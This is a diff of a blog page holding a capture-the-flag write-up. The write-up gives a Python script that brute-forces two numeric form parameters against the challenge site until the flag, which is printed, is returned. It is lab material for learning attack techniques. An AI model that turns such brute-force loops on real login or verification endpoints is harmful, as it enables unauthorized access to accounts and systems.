@@ -135,43 +135,45 @@ Pascals Blog
 <p>I want to see how many people are actually my friends and aren&rsquo;t just pretending! Only my best friends get flags. You can check our friendship status at this website. mhsctf-ettubrute.0xmmalik.repl.co (you may need to wait for the site to wake up)</p>
 <h2 id=writeup>Writeup</h2>
 <p>So I went ahead and wrote a simple brute force program in python:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/env python3</span>
+<pre><code class=language-python>#!/usr/bin/env python3
 
-<span style=color:#f92672>import</span> requests
-<span style=color:#f92672>from</span> requests.adapters <span style=color:#f92672>import</span> HTTPAdapter
-<span style=color:#f92672>from</span> requests.packages.urllib3.util.retry <span style=color:#f92672>import</span> Retry
+import requests
+from requests.adapters import HTTPAdapter
+from requests.packages.urllib3.util.retry import Retry
 
-<span style=color:#75715e># the url we are going to post to </span>
-url<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;https://mhsctf-ettubrute.0xmmalik.repl.co/status.php&#39;</span>
+# the url we are going to post to 
+url='https://mhsctf-ettubrute.0xmmalik.repl.co/status.php'
 
-<span style=color:#75715e># the two parameters we need to bruteforce</span>
-<span style=color:#75715e># they are integers between 1 and 100</span>
-number<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
-number2<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
+# the two parameters we need to bruteforce
+# they are integers between 1 and 100
+number=0
+number2=0
 
-<span style=color:#75715e># define the &#39;failed&#39; response</span>
-failed<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Sorry, you&#39;re clearly not my friend if you don&#39;t know my favorite and second favorite numbers!&#34;</span>
+# define the 'failed' response
+failed=&quot;Sorry, you're clearly not my friend if you don't know my favorite and second favorite numbers!&quot;
 
-session <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>Session()
-retry <span style=color:#f92672>=</span> Retry(connect<span style=color:#f92672>=</span><span style=color:#ae81ff>3</span>, backoff_factor<span style=color:#f92672>=</span><span style=color:#ae81ff>0.5</span>)
-adapter <span style=color:#f92672>=</span> HTTPAdapter(max_retries<span style=color:#f92672>=</span>retry)
-session<span style=color:#f92672>.</span>mount(<span style=color:#e6db74>&#39;http://&#39;</span>, adapter)
-session<span style=color:#f92672>.</span>mount(<span style=color:#e6db74>&#39;https://&#39;</span>, adapter)
+session = requests.Session()
+retry = Retry(connect=3, backoff_factor=0.5)
+adapter = HTTPAdapter(max_retries=retry)
+session.mount('http://', adapter)
+session.mount('https://', adapter)
 
-<span style=color:#75715e># iterate throught the possible combinations using two nested for loops</span>
-<span style=color:#66d9ef>for</span> number <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>100</span>):
-	<span style=color:#66d9ef>for</span> number2 <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>100</span>):
-		postobj <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#39;number&#39;</span>: number, <span style=color:#e6db74>&#39;number2&#39;</span>: number2}
-		result <span style=color:#f92672>=</span> session<span style=color:#f92672>.</span>post(url, data <span style=color:#f92672>=</span> postobj)
-		<span style=color:#66d9ef>if</span> (result<span style=color:#f92672>.</span>text <span style=color:#f92672>!=</span> failed): 
-			print(<span style=color:#e6db74>&#39;got the flag: &#39;</span>)
-			print(result<span style=color:#f92672>.</span>text)
-</code></pre></div><p>After some minutes of running my bruteforce utility i got the following response:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>got the flag: 
-Wow! You must really be my friend if you know my favorite and second favorite numbers! Here&#39;s a flag for you: flag{pur3_s7r3ngth}
-</code></pre></div><p>So the flag is</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>flag{pur3_s7r3ngth}
-</code></pre></div>
+# iterate throught the possible combinations using two nested for loops
+for number in range(100):
+	for number2 in range(100):
+		postobj = {'number': number, 'number2': number2}
+		result = session.post(url, data = postobj)
+		if (result.text != failed): 
+			print('got the flag: ')
+			print(result.text)
+</code></pre>
+<p>After some minutes of running my bruteforce utility i got the following response:</p>
+<pre><code>got the flag: 
+Wow! You must really be my friend if you know my favorite and second favorite numbers! Here's a flag for you: flag{pur3_s7r3ngth}
+</code></pre>
+<p>So the flag is</p>
+<pre><code>flag{pur3_s7r3ngth}
+</code></pre>
 </div>
 <div class=post__share>
 <div class=share__head>
